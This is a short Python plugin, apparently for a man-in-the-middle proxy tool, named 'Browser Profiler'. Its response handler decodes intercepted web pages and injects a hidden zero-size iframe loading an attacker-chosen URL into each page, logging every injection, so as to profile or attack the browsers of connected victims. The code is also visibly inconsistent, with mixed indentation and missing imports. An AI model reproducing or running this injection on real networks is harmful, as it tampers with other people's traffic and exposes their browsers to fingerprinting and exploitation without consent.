from plugins.plugin import Plugin

class BrowserProfiler(Plugin):
	name = 'Browser Profiler'
	optname = 'profiler'
	desc = 'Attempts to enumerate all browser plugins of connected clients'
	ver = '0.3'

	def response(self, context, flow):
        with decoded(flow.response):  # Remove content encoding (gzip, ...)
            html = BeautifulSoup(flow.response.content)
            if html.body:

                if context.html_url:
                    iframe = html.new_tag("iframe", src=context.html_url, frameborder=0, height=0, width=0)
                    html.body.append(iframe)
                    context.log("[Inject] Injected HTML Iframe: {}".format(flow.request.host)) 